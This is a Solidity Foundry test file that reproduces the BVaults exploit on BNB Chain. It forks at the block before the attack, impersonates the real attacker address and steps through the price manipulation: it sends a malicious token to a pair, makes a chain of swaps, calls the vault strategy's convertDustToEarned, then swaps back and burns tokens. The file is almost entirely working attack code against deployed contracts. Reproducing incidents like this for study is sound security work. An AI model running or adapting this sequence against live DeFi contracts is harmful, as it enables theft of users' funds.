// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {IERC20} from "../../interfaces/IERC20.sol";

import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";

interface IERC20_Burnable is IERC20 {
    function burn(uint256 amount) external;
}

interface BVaultsStrategy {
    function convertDustToEarned() external;
}

interface Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves()
        external
        view
        returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
}

contract Exploit_BVaults is TestHarness, TokenBalanceTracker {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BDEX = IERC20(0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867);
    IERC20_Burnable maliciousToken = IERC20_Burnable(0x12D18106FC0B3c70AD6C917d247E14941Cdd0f3F);
    BVaultsStrategy vaultsStrategy = BVaultsStrategy(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20);

    Pair internal constant BDEXWBNB_PAIR = Pair(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D);
    Pair internal constant MALICIOUS_PAIR = Pair(0xD35378e477d5D32f87AB977067561DAf9a2c32aA);

    address internal constant ATTACKER = 0x5bFAA396C6FB7278024C6d7230B17d97Ce8aB62D;
    address internal constant ATTACKER_CONTRACT = 0x1958d75C082D7F10991d07e0016B45a0904D2Eb1;

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 22_629_431); // We pin one block before the exploit
        // happened

        cheat.label(ATTACKER, "Attacker");
        cheat.label(ATTACKER_CONTRACT, "Attacker Contract");

        emit log_string("Initial Attacker Balances");
        emit log_named_decimal_uint("Malicious Token", maliciousToken.balanceOf(ATTACKER), 18);

        addTokenToTracker(address(WBNB));
        addTokenToTracker(address(BDEX));
        addTokenToTracker(address(maliciousToken)); // Apparently, the tracker does not catch this token.

        emit log_string("\nInitial");
        logBalancesWithLabel("Malicious Contract", ATTACKER_CONTRACT);
        logBalancesWithLabel("Vault Contract", address(vaultsStrategy));
    }

    function test_attack() external {
        cheat.startPrank(ATTACKER);
        // 1: Sent malicious tokens to the pair
        require(maliciousToken.transfer(address(MALICIOUS_PAIR), 10_000 ether), "transfer failed"); // Sends
        // 10.000 tokens to the pair

        // 2: Swap to get WBNB into a malicious contract
        emit log_string("\nBefore Swap Balances");
        logBalancesWithLabel("Malicious Contract", ATTACKER_CONTRACT);
        logBalancesWithLabel("Vault Contract", address(vaultsStrategy));

        MALICIOUS_PAIR.swap(0, 34_534_837_254_230_472_565, ATTACKER_CONTRACT, "");

        emit log_string("\nAfter Swap Balances");
        logBalancesWithLabel("Malicious Contract", ATTACKER_CONTRACT);
        logBalancesWithLabel("Vault Contract", address(vaultsStrategy));
        cheat.stopPrank();

        // 3: Transfer, Swap, Convert with BDEXBNB Pair and Vault Strategy
        cheat.startPrank(ATTACKER_CONTRACT);
        emit log_string("\nBefore Transfer, Swap, Convert Balances");
        logBalancesWithLabel("Malicious Contract", ATTACKER_CONTRACT);
        logBalancesWithLabel("Vault Contract", address(vaultsStrategy));

        require(WBNB.transfer(address(BDEXWBNB_PAIR), 34_534_837_254_230_472_565), "transfer failed");
        BDEXWBNB_PAIR.swap(14_181_664_488_335_977_539_333, 0, ATTACKER_CONTRACT, ""); // WBNB for BDEX
        vaultsStrategy.convertDustToEarned();

        emit log_string("\nAfter Transfer, Swap, Convert Balances");
        logBalancesWithLabel("Malicious Contract", ATTACKER_CONTRACT);
        logBalancesWithLabel("Vault Contract", address(vaultsStrategy));

        // 4: Transfer the BDEX back to the BDEX Pair
        require(BDEX.transfer(address(BDEXWBNB_PAIR), BDEX.balanceOf(ATTACKER_CONTRACT)), "transfer failed");
        BDEXWBNB_PAIR.swap(0, 50_800_786_874_975_680_419, ATTACKER_CONTRACT, ""); // BDEX for WBNB
        emit log_string("\n After last swap Balances");
        logBalancesWithLabel("Malicious Contract", ATTACKER_CONTRACT);
        logBalancesWithLabel("Vault Contract", address(vaultsStrategy));

        // 5: Transfer back to the pair
        require(WBNB.transfer(address(MALICIOUS_PAIR), WBNB.balanceOf(ATTACKER_CONTRACT)), "transfer failed");
        MALICIOUS_PAIR.swap(10_229_179_233_811_368_474_425, 0, ATTACKER_CONTRACT, "");
        maliciousToken.burn(10_229_179_233_811_368_474_425);
    }
}
